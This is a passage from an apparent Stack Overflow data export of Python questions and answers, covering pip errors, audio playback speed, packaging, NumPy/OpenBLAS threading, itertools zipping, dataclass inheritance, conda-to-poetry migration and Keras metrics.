  File &quot;C:\Users\---\AppData\Local\Programs\Python\Python310\lib\importlib\_common.py&quot;, line 89, in _tempfile
    os.write(fd, reader())
  File &quot;C:\Users\---\AppData\Local\Programs\Python\Python310\lib\importlib\abc.py&quot;, line 371, in read_bytes
    with self.open('rb') as strm:
  File &quot;C:\Users\---\AppData\Local\Programs\Python\Python310\lib\importlib\_adapters.py&quot;, line 54, in open
    raise ValueError()
ValueError

During handling of the above exception, another exception occurred:
</code></pre>
<p>last row of the printed log:</p>
<pre><code>PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\Users\\-----\\AppData\\Local\\Temp\\tmpunox3fhw'
</code></pre>
","72293534","<p>I found the answer in another question -
<a href=""https://stackoverflow.com/questions/72011315/permissionerror-winerror-32-the-process-cannot-access-the-file-because-it-is"">PermissionError: [WinError 32] The process cannot access the file because it is being used by another process: after installing python-certifi-win32</a></p>
<p>basically, you should remove two files that initialize <code>python-certifi-win32</code> when running pip. the files are located in the directory:</p>
<pre><code>C:\Users\&lt;username&gt;\AppData\Local\Programs\Python\Python310\Lib\site-packages
</code></pre>
<p>and their names are:</p>
<pre><code>python-certifi-win32-init.pth
distutils-precedence.pth
</code></pre>
<p>Shoutout to Richard from the mentioned post :)</p>
"
"71737743","1","How can I change playback speed of an audio file in python whilst it is playing?","<p>I've done alot of searching to try and find a way to achieve this but the solutions I've found either <a href=""https://stackoverflow.com/questions/51434897/how-to-change-audio-playback-speed-using-pydub"">don't do what I need</a> <a href=""https://stackoverflow.com/questions/38165103/python-changing-the-speed-of-sound-during-playback"">or</a> <a href=""https://stackoverflow.com/questions/44895126/play-sounds-of-varying-varying-pitch-asynchronously-and-concurrently"">I don't understand them</a>.</p>
<p>I'm looking for a way of playing a sound in python (non-blocking) that allows me to change the playback speed in real time, as it's playing, with no gaps or cutouts.</p>
<p>Changing the pitch is fine. Audio quality isn't even that important.</p>
<p>Most of the solutions <a href=""https://stackoverflow.com/questions/22755558/increase-decrease-play-speed-of-a-wav-file-python"">I've found</a> only allow setting the playback speed once, before the file is played.</p>
","71748928","<p>I've found a solution, using python-mpv, a wrapper for <a href=""https://mpv.io"" rel=""nofollow noreferrer"">mpv.io</a></p>
<pre><code>from pynput.keyboard import Key, Listener
import mpv
speed=1

#quick function to change speed via keyboard. 
def on_press(key):

    global speed

    if key.char == 'f' :
        speed=speed-0.1
        player.speed=speed
    if key.char == 'g' :
        speed=speed+0.1
        player.speed=speed

player = mpv.MPV(ytdl=True)
player.play('/Users/regvardy/mediapipe_faceswap-main/test.wav')
with Listener(
        on_press=on_press) as listener:
    listener.join()
while True:
    
    player.speed=speed
</code></pre>
<p>I haven't tested it for stability yet.</p>
<p>It feels like a workaround rather than me actually finding out how to do it so I may try and find a different solution.</p>
"
"72277275","1","How to monitor per-process network usage in Python?","<p>I'm looking to troubleshoot my internet issue so I need a way to track both my latency and which application is using how much network bandwidth.</p>
<p>I've already sorted out checking latency, but now I need a way to monitor each process' network usage (KB/s), like how it appears in Windows Task Manager.</p>
<p>Before you suggest a program, unless it's able to record the values with a timestamp then that's not what I'm looking for. I'm asking for a Pythonic way because I need to record the network bandwidth and latency values at the same time so I can figure out if a specific process is causing latency spikes.</p>
<p>So here's the info I need:</p>
<p>Time | Process ID | Process Name | Down Usage | Up Usage | Network Latency |</p>
<p>Also, please don't link to another Stackoverflow question unless you know their solution works. I've looked through plenty already and none of them work, which is why I'm asking again.</p>
","72310057","<p>Following the third section of <a href=""https://www.thepythoncode.com/article/make-a-network-usage-monitor-in-python"" rel=""nofollow noreferrer"">this guide</a> provided me with all of the information listed in the post, minus latency. Given that you said you already had measuring latency figured out, I assume this isn't an issue.</p>
<p>Logging this to csv/json/whatever is pretty easy, as all of the information is stored in panda data frames.</p>
<p>As this shows the time the process was created, you can use datetime to generate a new timestamp at the time of logging.</p>
<p>I tested this by logging to a csv after the printing_df variable was initialized, and had no issues.</p>
"
"72520366","1","Why does `functools.partial` not inherit `__name__` and other meta data by default?","<p>I am wondering why meta data (e.g. <code>__name__</code>, <code>__doc__</code>) for the wrapped method/function by <a href=""https://docs.python.org/3/library/functools.html#functools.partial"" rel=""nofollow noreferrer""><code>partial</code></a> is not inherited by default. Instead, <code>functools</code> provides the <a href=""https://docs.python.org/3/library/functools.html#functools.update_wrapper"" rel=""nofollow noreferrer""><code>update_wrapper</code></a> function.</p>
<p>Why it is not done by default is not mentioned anywhere (as far as I could see) e.g. <a href=""https://peps.python.org/pep-0309/"" rel=""nofollow noreferrer"">here</a> and many tutorials on <code>functools.partial</code> talk about how to &quot;solve the issue&quot; of a missing <code>__name__</code>.</p>
<p>Are there examples where inheriting this information causes problems/confusion?</p>
","72520451","<p>Think about what that would actually look like:</p>
<pre><code>def add(x, y):
    &quot;Adds two numbers&quot;
    return x + y

add_5 = partial(add, 5)
</code></pre>
<p>Would it actually make sense for <code>add_5</code> to have <code>__name__</code> set to <code>&quot;add&quot;</code> and <code>__doc__</code> set to <code>&quot;Adds two numbers&quot;</code>?</p>
<p>The callable created by <code>partial</code> behaves completely differently from the original function. It wouldn't be appropriate for the new callable to inherit the name and docstring of a function with completely different behavior.</p>
"
"72018887","1","How to build a universal wheel with pyproject.toml","<p>This is the project directory structure</p>
<pre><code>.
├── meow.py
└── pyproject.toml

0 directories, 2 files
</code></pre>
<p>This is the <code>meow.py</code>:</p>
<pre><code>def main():
    print(&quot;meow world&quot;)
</code></pre>
<p>This is the <code>pyproject.toml</code>:</p>
<pre><code>[build-system]
requires = [&quot;setuptools&quot;]
build-backend = &quot;setuptools.build_meta&quot;

[project]
name = &quot;meowpkg&quot;
version = &quot;0.1&quot;
description = &quot;a package that meows&quot;

[project.scripts]
meow_world = &quot;meow:main&quot;
</code></pre>
<p>When building this package, no matter whether with <code>python3 -m pip wheel .</code> or using <code>python3 -m build</code>, it creates a file named like <code>meowpkg-0.1-py3-none-any.whl</code> which can not be installed on Python 2.</p>
<pre><code>$ python2.7 -m pip install meowpkg-0.1-py3-none-any.whl
ERROR: meowpkg-0.1-py3-none-any.whl is not a supported wheel on this platform.
</code></pre>
<p>But &quot;meowpkg&quot; actually works on Python 2 as well. How to instruct setuptools and/or wheel to create a universal wheel tagged like <code>meowpkg-0.1-py2.py3-none-any.whl</code>, without using the old <code>setup.cfg</code>/<code>setup.py</code> ways?</p>
<p>Current workaround:</p>
<pre><code>echo &quot;[bdist_wheel]\nuniversal=1&quot; &gt; setup.cfg &amp;&amp; python3 -m build &amp;&amp; rm setup.cfg
</code></pre>
","72524833","<p>Add this section into the <code>pyproject.toml</code>:</p>
<pre><code>[tool.distutils.bdist_wheel]
universal = true
</code></pre>
"
"72663092","1","Getting numpy.linalg.svd and numpy matrix multiplication to use multithreadng","<p>I have a script that uses a lot of numpy and numpy.linalg functions and after some reaserch it tourned out that supposedly they automaticaly use multithreading. Altought that, my htop display always shows just one thread being used to run my script.</p>
<p>I am new to multithreading and I don´t quite now how to set up it correctly.</p>
<p>I am mostly making use of <code>numpy.linalg.svd</code></p>
<p>Here is the output of <code>numpy.show_config()</code></p>
<pre><code>openblas64__info:
    libraries = ['openblas64_', 'openblas64_']
    library_dirs = ['/usr/local/lib']
    language = c
    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None)]
    runtime_library_dirs = ['/usr/local/lib']
blas_ilp64_opt_info:
    libraries = ['openblas64_', 'openblas64_']
    library_dirs = ['/usr/local/lib']
    language = c
    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None)]
    runtime_library_dirs = ['/usr/local/lib']
openblas64__lapack_info:
    libraries = ['openblas64_', 'openblas64_']
    library_dirs = ['/usr/local/lib']
    language = c
    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None), ('HAVE_LAPACKE', None)]
    runtime_library_dirs = ['/usr/local/lib']
lapack_ilp64_opt_info:
    libraries = ['openblas64_', 'openblas64_']
    library_dirs = ['/usr/local/lib']
    language = c
    define_macros = [('HAVE_CBLAS', None), ('BLAS_SYMBOL_SUFFIX', '64_'), ('HAVE_BLAS_ILP64', None), ('HAVE_LAPACKE', None)]
    runtime_library_dirs = ['/usr/local/lib']
Supported SIMD extensions in this NumPy install:
    baseline = SSE,SSE2,SSE3
    found = SSSE3,SSE41,POPCNT,SSE42,AVX,F16C,FMA3,AVX2
    not found = AVX512F,AVX512CD,AVX512_KNL,AVX512_KNM,AVX512_SKX,AVX512_CLX,AVX512_CNL,AVX512_ICL
</code></pre>
<p><em><strong>MRE</strong></em></p>
<pre><code>import numpy as np 
import tensorly as ty 


tensor = np.random.rand(32,32,32,32)

unfolding = ty.unfold(tensor,0)
unfolding = unfolding @ unfolding.transpose()
U,S,_ = np.linalg.svd(unfolding)

</code></pre>
<p><em><strong>Update</strong></em></p>
<p>As suggested in the accepted answer, rebuilding numpy with MKL solved the issue.</p>
","72669414","<p>The main issue is that the size of <strong>the matrices is too small</strong> for threads to be really worth it on all platforms. Indeed, OpenBLAS uses OpenMP to create threads regarding the size of the matrix. Threads are generally created once but the creation can take from dozens of microseconds to dozens of milliseconds regarding the machine (typically hundreds of microseconds on a regular PC). The bigger the number of cores on the machine the bigger the number of threads to create and so the bigger the overhead. When the OpenMP thread pool is reused, there are still overheads to pay mainly due to the distribution of the work and synchronizations between threads though the overheads are generally significantly smaller (typically an order of magnitude smaller).</p>
<p>That being said, <strong>OpenBLAS makes clearly sub-optimal choices when the output matrix is tiny compared to the input ones</strong> (which is your case). Indeed, OpenBLAS can hardly know the parallel overhead before running the target kernel so it has to make a choice: set a <strong>threshold</strong> typically <em>based on the size of the input matrix</em> so to define when the kernel will be executed sequentially or with multiple threads. This is critical for very small kernel to still be fast as well as huge ones to remain competitive with other BLAS implementations. The thing is this threshold is not perfectly chosen. It looks like OpenBLAS only look the size of the output matrix which is clearly sub-optimal for &quot;thin&quot; matrices like in your code (eg. 50x1000000 @ 1000000x50). An empirical analysis show that the threshold is arbitrary set to 100x100 in your case: beyond this threshold, OpenBLAS use multiple threads but not otherwise. The thing is threads are already useful for significantly smaller matrices in your case on most platforms (eg. for 64x64x64x64 tensors).</p>
<p>This threshold is <strong>tuned by compile-time definitions</strong> like <code>GEMM_MULTITHREAD_THRESHOLD</code> which is used in <a href=""https://github.com/xianyi/OpenBLAS/blob/da5bd8b5e32ec9dd6c6ef51f6a77f0051a01e02c/interface/gemm.c#L503"" rel=""noreferrer"">gemm.c</a> (or <a href=""https://github.com/xianyi/OpenBLAS/blob/d947116390a211f9b60c3c336c4adc4f66225594/interface/gemv.c#L229"" rel=""noreferrer"">gemv.c</a>. Note that in the code, the k dimension matters but this is not what benchmarks show on my machine (possibly due to an older version of OpenBLAS being used). You can <strong>rebuild OpenBLAS with a smaller threshold</strong> (like 1 instead of 4).</p>
<p>An alternative solution is to use another BLAS implementation like <strong>BLIS</strong> or the <strong>Intel MKL</strong> that should use different threshold (possibly better ones). A last solution is to implement a <strong>specific implementation</strong> to efficiently compute the matrices of your code (possibly using Numba or Cython) but BLAS implementations are heavily optimized so it is often hard to actually write a faster code (unless you are very familiar with low-level optimizations, compilers, and modern processor architectures).</p>

"
"72677648","1","How to iterate through list infinitely with +1 offset each loop","<p>I want to infinitely iterate through the list from 0 to the end, but in the next loop I want to start at 1 to the end plus 0, and the next loop would start at 2 to the end plus 0, 1, up to the last item where it would start again at 0 and go to the end.</p>
<p>Here is my code:</p>
<pre><code>a = [ 0, 1, 2 ]
offset = 0
rotate = 0

while True:
    print(a[rotate])
    offset += 1
    rotate += 1
    if offset &gt;= len(a):
        offset = 0
        rotate += 1
    if rotate &gt;= len(a):
        rotate = 0
</code></pre>
<p>This is the solution I came up with so far. It's far from perfect.</p>
<p>The result that I want is:</p>
<pre><code>0, 1, 2 # first iteration
1, 2, 0 # second iteration
2, 0, 1 # third iteration
0, 1, 2 # fourth iteration
</code></pre>
<p>and so on.</p>
","72683695","<p>You can use a <a href=""https://docs.python.org/3/library/collections.html#collections.deque"" rel=""noreferrer""><code>deque</code></a> which has a built-in and efficient rotate function (~O(1)):</p>
<pre><code>&gt;&gt;&gt; d = deque([0,1,2])
&gt;&gt;&gt; for _ in range(10):
...     print(*d)
...     d.rotate(-1)  # negative -&gt; rotate to the left
...
0 1 2
1 2 0
2 0 1
0 1 2
1 2 0
2 0 1
0 1 2
1 2 0
2 0 1
0 1 2
</code></pre>
"
"72175135","1","mypy - How to mark line as unreachable","<p>I've got a function of the form:</p>
<pre class=""lang-py prettyprint-override""><code>def get_new_file(prefix: str) -&gt; pathlib.Path:
    for i in itertools.count(0):
        p = pathlib.Path(f'{prefix}_{i}')
        if not p.is_file():
            return p
    # This line is unreachable.
</code></pre>
<p>mypy understandably complains that the function is missing a return statement.  Is there a way to mark a line so as to inform mypy that the line should be considered unreachable?</p>
","72175249","<p>This was raised as <a href=""https://github.com/python/mypy/issues/5992"" rel=""noreferrer"">an issue</a>. The recommended solution is <code>assert False</code>.</p>
<pre class=""lang-py prettyprint-override""><code>def get_new_file(prefix: str) -&gt; pathlib.Path:
    for i in itertools.count(0):
        p = pathlib.Path(f'{prefix}_{i}')
        if not p.is_file():
            return p
    assert False
</code></pre>
"
"71102876","1","in ipython how do I accept and use an autocomplete suggestion?","<p>I'm using Python 3.8.9 with IPython 8.0.1 on macOS. When I type anything whatsoever, it displays a predicted suggestion based on past commands. Cool.</p>
<p>However, how do I actually accept that suggestion? I tried the obvious: tab, which does <em>not</em> accept the suggestion, but rather opens up a menu with <em>different</em> suggestions, while the original suggestion is still there (see screenshot).</p>
<p>I also tried space, and return, but both of those act as if the suggestion was never made. How the heck do I actually <em>use</em> the ipython autosuggestion? Or is tab supposed to work and something is wrong with my ipython build or something?</p>
<p><a href=""https://i.stack.imgur.com/0x5Au.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/0x5Au.png"" alt=""enter image description here"" /></a></p>
","71459528","<p><code>CTRL-E</code>, <code>CTRL-F</code>, or <code>Right Arrow Key</code>
<a href=""https://ipython.readthedocs.io/en/6.x/config/shortcuts/index.html"" rel=""noreferrer"">https://ipython.readthedocs.io/en/6.x/config/shortcuts/index.html</a></p>
"
"71689095","1","How to solve the pytorch RuntimeError: Numpy is not available without upgrading numpy to the latest version because of other dependencies","<p>I am running a simple CNN using Pytorch for some audio classification on my Raspberry Pi 4 on Python 3.9.2 (64-bit). For the audio manipulation needed I am using librosa. librosa depends on the numba package which is only compatible with numpy version &lt;= 1.20.</p>
<p>When running my code, the line</p>
<pre><code>spect_tensor = torch.from_numpy(spect).double()
</code></pre>
<p>throws the RuntimeError:</p>
<pre><code>RuntimeError: Numpy is not available
</code></pre>
<p>Searching the internet for solutions I found upgrading Numpy to the latest version to resolve that specific error, but throwing another error, because Numba only works with Numpy &lt;= 1.20.</p>
<p>Is there a solution to this problem which does not include searching for an alternative to using librosa?</p>
","71750812","<p>Just wanted to give an update on my situation. I downgraded torch to version 0.9.1 which solved the original issue. Now OpenBLAS is throwing a warning because of an open MPLoop. But for now my code is up and running.</p>
"
"71520075","1","zip_longest for the left list always","<p>I know about the <code>zip</code> function (which will zip according to the shortest list) and <code>zip_longest</code> (which will zip according to the longest list), but how would I zip according to the first list, regardless of whether it's the longest or not?</p>
<p>For example:</p>
<pre><code>Input:  ['a', 'b', 'c'], [1, 2]
Output: [('a', 1), ('b', 2), ('c', None)]
</code></pre>
<p>But also:</p>
<pre><code>Input:  ['a', 'b'], [1, 2, 3]
Output: [('a', 1), ('b', 2)]
</code></pre>
<p>Do both of these functionalities exist in one function?</p>
","71520401","<h3>Solutions</h3>
<p>Chaining the repeated fillvalue behind the iterables other than the first:</p>
<pre><code>from itertools import chain, repeat

def zip_first(first, *rest, fillvalue=None):
    return zip(first, *map(chain, rest, repeat(repeat(fillvalue))))
</code></pre>
<p>Or using <code>zip_longest</code> and trim it with a <code>compress</code> and <code>zip</code> trick:</p>
<pre><code>def zip_first(first, *rest, fillvalue=None):
    a, b = tee(first)
    return compress(zip_longest(b, *rest, fillvalue=fillvalue), zip(a))
</code></pre>
<p>Just like <code>zip</code> and <code>zip_longest</code>, these take any number (well, at least one) of any kind of iterables (including infinite ones) and return an iterator (convert to list if needed).</p>
<h3>Benchmark results</h3>
<p>Benchmarks with other equally general solutions (all code is at the end of the answer):</p>
<pre class=""lang-text prettyprint-override""><code>10 iterables of 10,000 to 90,000 elements, first has 50,000:
────────────────────────────────────────────────────────────
 2.2 ms   2.2 ms   2.3 ms  limit_cheat
 2.6 ms   2.6 ms   2.6 ms  Kelly_Bundy_chain
 3.3 ms   3.3 ms   3.3 ms  Kelly_Bundy_compress
50.2 ms  50.6 ms  50.7 ms  CrazyChucky
54.7 ms  55.0 ms  55.0 ms  Sven_Marnach
74.8 ms  74.9 ms  75.0 ms  Mad_Physicist
 5.4 ms   5.4 ms   5.4 ms  Kelly_Bundy_3
 5.9 ms   6.0 ms   6.0 ms  Kelly_Bundy_4
 4.6 ms   4.7 ms   4.7 ms  Kelly_Bundy_5

10,000 iterables of 0 to 100 elements, first has 50:
────────────────────────────────────────────────────
 4.6 ms   4.7 ms   4.8 ms  limit_cheat
 4.8 ms   4.8 ms   4.8 ms  Kelly_Bundy_compress
 8.4 ms   8.4 ms   8.4 ms  Kelly_Bundy_chain
27.1 ms  27.3 ms  27.5 ms  CrazyChucky
38.3 ms  38.5 ms  38.7 ms  Sven_Marnach
73.0 ms  73.0 ms  73.1 ms  Mad_Physicist
 4.9 ms   4.9 ms   5.0 ms  Kelly_Bundy_3
 4.9 ms   4.9 ms   5.0 ms  Kelly_Bundy_4
 5.0 ms   5.0 ms   5.0 ms  Kelly_Bundy_5

</code></pre>
<p>The first one is a cheat that knows the length, included to show what's probably a limit for how fast we can get.</p>
<h3>Explanations</h3>
<p>A little explanation of the above two solutions:</p>
<p>The first solution, if used with for example three iterables, is equivalent to this:</p>
<pre><code>def zip_first(first, second, third, fillvalue=None):
    filler = repeat(fillvalue)
    return zip(first,
               chain(second, filler),
               chain(third, filler))
</code></pre>
<p>The second solution basically lets <code>zip_longest</code> do the job. The only problem with that is that it doesn't stop when the first iterable is done. So I duplicate the first iterable (with <code>tee</code>) and then use one for its elements and the other for its length. The <code>zip(a)</code> wraps every element in a 1-tuple, and non-empty tuples are <a href=""https://docs.python.org/3/library/stdtypes.html#truth-value-testing"" rel=""nofollow noreferrer"">true</a>. So <a href=""https://docs.python.org/3/library/itertools.html#itertools.compress"" rel=""nofollow noreferrer""><code>compress</code></a> gives me all tuples produced by <code>zip_longest</code>, as many as there are elements in the first iterable.</p>
<h3>Benchmark code (<a href=""https://tio.run/##pVZRi9s4EH7PrxCUEntxloTdhSOQQjftQbnrcrB9C8EoziRRK0s@WenG@fN7I8mW5TjZ5qhhN8mMZ@b7ZkYzKiq9k@Luj0K9vq5hQzjLmU6zHVAd3TANiq44lAnZMM5/Ur6H2ZMUEE8HBB8Feq8EYSVnGURHVqRcii2Ul0z9tzghNkTKQWz1Lh4MTOy/gPMqfdyLdYUIKBPRhqlSJ@RGgfl4CwMG92/ntIisfUKcoYLC8Kk/WhT4nIks8wLNymuC04SsyIxoAPd2HELyjsLErM44DNNieNAG1lzRYzXf7bMf1a@L8fz56duXp89/Ix65@g6Zjhwa@28jFWn4SL0DVRJmk/aLijVO6xjmYRvnCcvuY7balr8X1fFmZMGMMTOGQuoWMPAS2pgWKzPwnOHSO6oY8DWJujzqVD3/BJF@pUrQbHdd2yADAwlZRyq2QZUJahRLn7ODEVl30xMYB/QfCThgWwUhThzV4L7SdfrPripZxkymqdpeKuI7W5NVldqY0fDj4/zTMCHDQzUMLYajYUxGow/k44E8VmQ@Ip9Gl@yd@fHlTQfHQV1aUxiDr6UbVNO2iJZ1MU3mmHaMmTaUjaHL3cuOcSDf1B5aRzayNW1Lam2T2hzEPjcBIPKB4m5naVV1Bd4vurXFYPUZbB44ZFBgr2lZfLFOmRR9F7YtZzMy7qvONLS3alAu2BLj98bLRaT@lUFPW97SogCxjk5cuKbT@4KDU5VnRtfdb88sMzqRVr4Fbco7aSZSQq4fYueG6v01yEoQmgngpxPMNMnxdF51FsSiMV3Gb0LrTLHjYrw0s6ix7dZ@pYD@OEn/sU/s4Spi2H0FrJHXnxRnnZUZR0YeBaCEFFxmlDcGXtE6MEdqcKEvLcgrM@ZC/49s1RCuStKA5YVUmmiWA9ODjZK5PSxaSo6Lxyn9hjanptNfSX2jSEyTJn6POj@ycIeucdN2q9NnknNsHTzmPtIa/sWkDTZ7kdnxYwEHF53ECnq3jzPiGonTBNvZCcId5CSdwd/3d9cX3fdFD8lg6RpPmzKaIZtmmHhMApaoHvtzqRTSFiZPbu4V@BPZcrNyLHVsd7d7GuvIHFV/O8BX7LIzr4bTv9zzjp8LPsxTKCbMNcuZzGoQifV5m6aC5pCmwa3kHXkuoG5zXdraLJYWTeqhtLvYyhTFFokegt50QU9BhBhPQoeMscWam5BLkhH0tg4Cy/HouHa@rec8p/lqTaeuu85nJiFj/MOttgI1m8TdhaD9qD9ZWY7ATTR8f3872ZC8JEPynkSa3JAJ3Ll9a/dlic0NaF7Gi@mdmXwnebY9YyFt4CVd7bU9YKm/6DWjZ8vlCodOeCO38lCAKXgYp@Px2JXDXgD9yhsntTLu3K1qLe73idUiARa31ztXyonRxstwCYUTNSCRU1FZFuUOif8GjYsULsFnmP/JeHIeu@X9Bv720J6vQuwG02KCNTR3A/9jMZ2OJsvA/lIC4tfX/wA"" rel=""nofollow noreferrer"" title=""Python 3.8 (pre-release) – Try It Online"">Try it online!</a>)</h3>
<pre><code>def limit_cheat(*iterables, fillvalue=None):
    return islice(zip_longest(*iterables, fillvalue=fillvalue), cheat_length)

def Kelly_Bundy_chain(first, *rest, fillvalue=None):
    return zip(first, *map(chain, rest, repeat(repeat(fillvalue))))

def Kelly_Bundy_compress(first, *rest, fillvalue=None):
    a, b = tee(first)
    return compress(zip_longest(b, *rest, fillvalue=fillvalue), zip(a))

def CrazyChucky(*iterables, fillvalue=None):
    SENTINEL = object()
    
    for first, *others in zip_longest(*iterables, fillvalue=SENTINEL):
        if first is SENTINEL:
            return
        others = [i if i is not SENTINEL else fillvalue for i in others]
        yield (first, *others)

def Sven_Marnach(first, *rest, fillvalue=None):
    rest = [iter(r) for r in rest]
    for x in first:
        yield x, *(next(r, fillvalue) for r in rest)

def Mad_Physicist(*args, fillvalue=None):
    # zip_by_first('ABCD', 'xy', fillvalue='-') --&gt; Ax By C- D-
    # zip_by_first('ABC', 'xyzw', fillvalue='-') --&gt; Ax By Cz
    if not args:
        return
    iterators = [iter(it) for it in args]
    while True:
        values = []
        for i, it in enumerate(iterators):
            try:
                value = next(it)
            except StopIteration:
                if i == 0:
                    return
                iterators[i] = repeat(fillvalue)
                value = fillvalue
            values.append(value)
        yield tuple(values)

def Kelly_Bundy_3(first, *rest, fillvalue=None):
    a, b = tee(first)
    return map(itemgetter(1), zip(a, zip_longest(b, *rest, fillvalue=fillvalue)))

def Kelly_Bundy_4(first, *rest, fillvalue=None):
    sentinel = object()
    for z in zip_longest(chain(first, [sentinel]), *rest, fillvalue=fillvalue):
        if z[0] is sentinel:
            break
        yield z

def Kelly_Bundy_5(first, *rest, fillvalue=None):
    stopped = False
    def stop():
        nonlocal stopped
        stopped = True
        return
        yield
    for z in zip_longest(chain(first, stop()), *rest, fillvalue=fillvalue):
        if stopped:
            break
        yield z


import timeit
from itertools import chain, repeat, zip_longest, islice, tee, compress
from operator import itemgetter
from collections import deque

funcs = [
    limit_cheat,
    Kelly_Bundy_chain,
    Kelly_Bundy_compress,
    CrazyChucky,
    Sven_Marnach,
    Mad_Physicist,
    Kelly_Bundy_3,
    Kelly_Bundy_4,
    Kelly_Bundy_5,
]

def test(args_creator):

    # Correctness
    expect = list(funcs[0](*args_creator()))
    for func in funcs:
        result = list(func(*args_creator()))
        print(result == expect, func.__name__)
    
    # Speed
    tss = [[] for _ in funcs]
    for _ in range(5):
        print()
        print(args_creator.__name__)
        for func, ts in zip(funcs, tss):
            t = min(timeit.repeat(lambda: deque(func(*args_creator()), 0), number=1))
            ts.append(t)
            print(*('%4.1f ms ' % (t * 1e3) for t in sorted(ts)[:3]), func.__name__)

def args_few_but_long_iterables():
    global cheat_length
    cheat_length = 50_000
    first = repeat(0, 50_000)
    rest = [repeat(i, 10_000 * i) for i in range(1, 10)]
    return first, *rest

def args_many_but_short_iterables():
    global cheat_length
    cheat_length = 50
    first = repeat(0, 50)
    rest = [repeat(i, i % 101) for i in range(1, 10_000)]
    return first, *rest

test(args_few_but_long_iterables)
funcs[1:3] = funcs[1:3][::-1]
test(args_many_but_short_iterables)
</code></pre>
"
"72472220","1","dataclass inheritance: Fields without default values cannot appear after fields with default values","<h2>Context</h2>
<p>I created two data classes to handle table metadata. <code>TableMetadata</code> apply to any kind of tables, while <code>RestTableMetadata</code> contains information relevant for data extracted from REST apis</p>
<pre class=""lang-py prettyprint-override""><code>@dataclass
class TableMetadata:
    &quot;&quot;&quot;
    - entity: business entity represented by the table
    - origin: path / query / url from which data withdrawn
    - id: field to be used as ID (unique)
    - historicity: full, delta
    - upload: should the table be uploaded
    &quot;&quot;&quot;

    entity: str
    origin: str
    view: str
    id: str = None
    historicity: str = &quot;full&quot;
    upload: bool = True
    columns: list = field(default_factory=list)


@dataclass
class RestTableMetadata(TableMetadata):
    &quot;&quot;&quot;
    - method: HTTP method to be used
    - payloadpath: portion of the response payload to use to build the dataframe
    &quot;&quot;&quot;

    method: str
    payloadpath: str = None
</code></pre>
<h2>Problem</h2>
<p>Because of inheritance, <code>method</code> (without default values) comes after <code>columns</code>, resulting in the following <strong>Pylance</strong> error: <code>Fields without default values cannot appear after fields with default values</code></p>
<p>I'm looking for a way to fix it without overriding <code>__init__</code> (if there is such a way). I also noticed a method called <code>__init_subclass__</code> (<em>This method is called when a class is subclassed.</em>) that might affect how <code>RestTableMetadata.__init__</code> and other subclasses is generated.</p>
","72715549","<p>Here is a working solution for python &gt; 3.10</p>
<pre class=""lang-py prettyprint-override""><code>@dataclass(kw_only=True)
class TableMetadata:
    &quot;&quot;&quot;
    - entity: business entity represented by the table
    - origin: path / query / url from which data withdrawn
    - id: field to be used as ID (unique)
    - historicity: full, delta
    - upload: should the table be uploaded
    &quot;&quot;&quot;

    entity: str
    origin: str
    view: str
    id: str = None
    historicity: str = &quot;full&quot;
    upload: bool = True
    columns: list = field(default_factory=list)


@dataclass(kw_only=True)
class RestTableMetadata(TableMetadata):
    &quot;&quot;&quot;
    - method: HTTP method to be used
    - payloadpath: portion of the response payload to use to build the dataframe
    &quot;&quot;&quot;

    method: str
    payloadpath: str = None
</code></pre>
"
"72202728","1","Conda to poetry environment","<p>I have a conda environment that I would like to convert to a poetry environment.</p>
<p>What I have tried is to translate the <code>environment.yaml</code> of the conda environment into a <code>pyproject.toml</code> file that poetry can read. Here you have the steps:</p>
<ol>
<li><p>Generate the yaml file</p>
<p><code>conda env export --from-history &gt; environment.yaml</code></p>
<p>The <code>--from-history</code> flag includes only the packages that I explicitly asked for. Here it is how the file looks like after installing numpy.</p>
<pre><code># environment.yaml

name: C:\Users\EDOCIC\Screepts\My_projects\Tests\conda2poetry\condaenv
channels:
  - defaults
dependencies:
  - numpy
</code></pre>
</li>
<li><p>Manually create the <code>pyproject.toml</code> file out of <code>environment.yaml</code>. I added the numpy version, which I got from <code>conda env export</code>. Here it is the result:</p>
<pre><code># pyproject.toml

[tool.poetry]
name = &quot;conda2poetry&quot;
version = &quot;0.1.0&quot;
description = &quot;&quot;
authors = [&quot;&quot;]

[tool.poetry.dependencies]
python = &quot;~3.7&quot;
numpy = &quot;^1.21.5&quot;

[tool.poetry.dev-dependencies]

[build-system]
requires = [&quot;poetry-core&gt;=1.0.0&quot;]
build-backend = &quot;poetry.core.masonry.api&quot;
</code></pre>
</li>
<li><p>Create the environment with <code>poetry init</code>, which will automatically read the toml file.</p>
</li>
</ol>
<p>The process seems to work but it's quite manual and prone to mistakes.
<strong>Is there a better way?</strong></p>
","72204094","<p>No, there is not a better way. Conda is a generic package manager and does not discern Python versus non-Python packages, therefore this has to be done with manual curation.</p>
<p>Additionally, package names might also differ. For example <code>py-opencv</code>(conda-forge) vs <code>opencv-python</code> (PyPi).</p>
<h2>Tips</h2>
<p>In addition to pulling down the <code>--from-history</code> YAML, it may also help to dump out a <code>pip list --format=freeze</code>. This could help with resolving any tricky packages that use different names in Conda versus PyPI.</p>
<p>If the environment uses any PyPI packages directly, this won't be seen from a <code>conda env export --from-history</code>. However, these will appear when using <code>conda list</code> (entries with channel <strong>pypi</strong>) or plain <code>conda env export</code>, which would have a <code>dependencies.pip:</code> section if there are any.</p>
"
"71412499","1","How to prevent Keras from computing metrics during training","<p>I'm using Tensorflow/Keras 2.4.1 and I have a (unsupervised) custom metric that takes several of my model inputs as parameters such as:</p>
<pre class=""lang-py prettyprint-override""><code>model = build_model() # returns a tf.keras.Model object
my_metric = custom_metric(model.output, model.input[0], model.input[1])
model.add_metric(my_metric)
[...]
model.fit([...]) # training with fit
</code></pre>
<p>However, it happens that <code>custom_metric</code> is very expensive so I would like it to be computed during validation only. I found this <a href=""https://stackoverflow.com/a/60829012/6315123"">answer</a> but I hardly understand how I can adapt the solution to my metric that uses several model inputs as parameter since the <code>update_state</code> method doesn't seem flexible.</p>
<p>In my context, is there a way to avoid computing my metric during training, aside from writing my own training loop ?
Also, I am very surprised we cannot natively specify to Tensorflow that some metrics should only be computed at validation time, is there a reason for that ?</p>
